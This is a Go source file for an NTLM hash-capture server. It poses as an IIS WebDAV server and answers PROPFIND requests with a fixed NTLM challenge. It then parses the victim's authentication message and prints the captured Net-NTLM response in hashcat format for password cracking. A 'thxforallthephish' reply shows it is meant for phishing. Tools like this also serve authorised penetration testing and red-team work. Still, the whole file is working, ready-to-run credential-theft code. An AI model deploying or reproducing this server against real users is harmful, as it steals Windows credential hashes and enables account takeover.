package printntlm

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/audibleblink/go-ntlm/ntlm"
)

var (
	Stop    chan bool
	One     bool
	headers = map[string]string{
		"Connection": "Keep-Alive",
		"Keep-Alive": "timeout=5, max=100",
		"Server":     "Microsoft-IIS/7.5",
	}
)

const Challenge = "TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQL" +
	"ODgAAAA9TAE0AQgACAAYARgBUAFAAAQAWAEYAVABQAC0AVABPAE8ATABCAE8AWAAEABIAZgB0AHAA" +
	"LgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAxADYALgBmAHQAYgAuAGwAbwBjAGEAbAAFA" +
	"BIAZgB0AHAALgBsAG8AYwBhAGwAAAAAAA=="

func ServeWebDAV(port int) *http.Server {
	portStr := fmt.Sprintf("0.0.0.0:%d", port)
	srv := &http.Server{Addr: portStr}
	http.HandleFunc("/", handleRequest)

	go func() {
		if err := srv.ListenAndServe(); err != nil {
			os.Exit(0)
		}
	}()
	return srv
}

func handleRequest(w http.ResponseWriter, r *http.Request) {
	for k, v := range headers {
		w.Header().Set(k, v)
	}

	method := r.Method
	switch method {
	case "OPTIONS":
		w.Header().Set("Allow", "OPTIONS,GET,HEAD,POST,PUT,DELETE,TRACE,"+
			"PROPFIND,PROPPATCH,MKCOL,COPY,MOVE,LOCK,UNLOCK")

	case "PROPFIND":
		authHeader := ""
		if r.Header["Authorization"] != nil {
			authHeader = r.Header["Authorization"][0]
		}

		switch ntlmType(authHeader) {
		case -1:
			w.WriteHeader(418)
		case 0:
			w.Header().Set("WWW-Authenticate", "NTLM")
			w.WriteHeader(401)
		case 1:
			w.Header().Set("WWW-Authenticate", fmt.Sprintf("NTLM %s", Challenge))
			w.WriteHeader(401)
		case 3:
			ntlmBytes, err := headerBytes(authHeader)
			if err != nil {
				w.WriteHeader(418)
				return
			}
			hashType := getHashType(authHeader)
			netNTLMResponse, err := ntlm.ParseAuthenticateMessage(ntlmBytes, hashType)
			if err != nil {
				w.WriteHeader(418)
				return
			}

			toHashcat(netNTLMResponse, hashType)
			w.Write([]byte("thxforallthephish"))
			if One {
				Stop <- true
			}
		}

	default:
		w.WriteHeader(418)
	}
}

func toHashcat(h *ntlm.AuthenticateMessage, ntlmVer int) {
	template := "%s::%s:%s:%s:%s\n"
	un := h.UserName.String()
	dn := h.DomainName.String()
	ws := h.Workstation.String()
	ch := "1122334455667788"

	if ntlmVer == 1 {
		lm := h.LmChallengeResponse.String()
		nt := h.NtlmV1Response.String()
		fmt.Printf(template, un, ws, lm, nt, ch)
	} else {
		v2 := h.NtChallengeResponseFields.String()
		lm := v2[0:31]
		nt := v2[32 : len(v2)-1]
		fmt.Printf(template, un, dn, ch, lm, nt)
	}
}

func getHashType(header string) int {
	netNTLMMessageBytes, err := headerBytes(header)
	if err != nil {
		return -1
	}

	hashSize := netNTLMMessageBytes[22]
	if hashSize == 24 {
		return 1
	}
	return 2
}

func headerBytes(header string) ([]byte, error) {
	b64 := strings.TrimPrefix(header, "NTLM ")
	netNTLMMessageBytes, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return netNTLMMessageBytes, err
	}
	return netNTLMMessageBytes, err
}

func ntlmType(header string) int {
	netNTLMMessageBytes, err := headerBytes(header)
	if err != nil {
		return -1
	}

	size := len(netNTLMMessageBytes)
	switch {
	case size == 0:
		return 0
	case size <= 64:
		return 1
	default:
		return 3
	}
}
